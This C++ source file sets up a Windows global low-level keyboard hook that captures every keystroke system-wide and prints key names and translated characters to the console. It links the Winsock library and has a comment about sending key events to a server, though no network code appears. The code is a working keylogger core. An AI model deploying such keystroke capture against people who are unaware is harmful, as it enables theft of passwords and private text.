#include "keyboard_track.h"
#pragma comment(lib, "ws2_32.lib")

//https://stackoverflow.com/questions/38100667/windows-virtual-key-codes
std::wstring VirtualKeyCodeToString(UCHAR virtualKey)
{
	UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

	char szName[32];
	int result = 0;
	switch (virtualKey)
	{
	case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
	case VK_RCONTROL: case VK_RMENU:
	case VK_LWIN: case VK_RWIN: case VK_APPS:
	case VK_PRIOR: case VK_NEXT:
	case VK_END: case VK_HOME:
	case VK_INSERT: case VK_DELETE:
	case VK_DIVIDE:
	case VK_NUMLOCK:
		scanCode |= KF_EXTENDED;
	default:
		result = GetKeyNameTextA(scanCode << 16, szName, 32);
	}

	int len = MultiByteToWideChar(CP_ACP, 0, szName, -1, NULL, 0);
	std::wstring wstr(len, 0);
	MultiByteToWideChar(CP_ACP, 0, szName, -1, &wstr[0], len);
	return wstr;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) //isKeyDown
	{	

		// Print the key code and character to the console OR // Send the key event to the server
		//######################################################################################
		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
		// Get the key code and key state
		int keyCode = pKeyboardStruct->vkCode;
		//Get the name of virtual key code
		std::wstring name = VirtualKeyCodeToString(keyCode);
		//Print out the key name
		std::wcout << name << "\n"; //PRINT THE KEY NAME => OUTPUT IN A DIFFERENT WIDGET


		

		// Get the keyboard state
		SHORT shiftState = GetAsyncKeyState(VK_SHIFT);
		SHORT capsLockState = GetKeyState(VK_CAPITAL);

		// Convert the virtual key code to a character
		BYTE keyboardState[256] = { 0 };
		keyboardState[VK_SHIFT] = (shiftState & 0x8000) ? 0x80 : 0;
		keyboardState[VK_CAPITAL] = (capsLockState & 0x0001) ? 0x01 : 0;

		WCHAR charBuffer[2] = { 0 };
		UINT scanCode = MapVirtualKeyEx(pKeyboardStruct->vkCode, MAPVK_VK_TO_VSC, GetKeyboardLayout(0));
		int result = ToUnicodeEx(pKeyboardStruct->vkCode, scanCode, keyboardState, charBuffer, 2, 0, GetKeyboardLayout(0));

		// Check if the characters were translated successfully
		if (result > 0)
		{
			// Print the translated character message
			std::wcout << "Translated Character Message: " << charBuffer << std::endl; //PRINT THE KEY CHARACTER => OUTPUT IN ANOTHER WIDGET
		}		
	}

	// Call the next hook in the chain
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void tracking_keyboard() {
	// Set up a keyboard hook
	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

	// Enter the message loop to keep the hook active
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Remove the keyboard hook
	UnhookWindowsHookEx(keyboardHook);
}

#include <fstream>

int main()
{
	// Open the file "hello.txt" for writing, and create it if it doesn't exist
    std::ofstream file("hello.txt", std::ios::app);

    // Check if the file was opened successfully
    if (file.is_open()) {
        // Write "Hello, world!" to the file
        file << "Hello, world!\n";

        // Close the file
        file.close();

        std::cout << "Successfully wrote to file hello.txt\n";
    } else {
        std::cout << "Failed to open file hello.txt for writing\n";
    }
    tracking_keyboard();

}




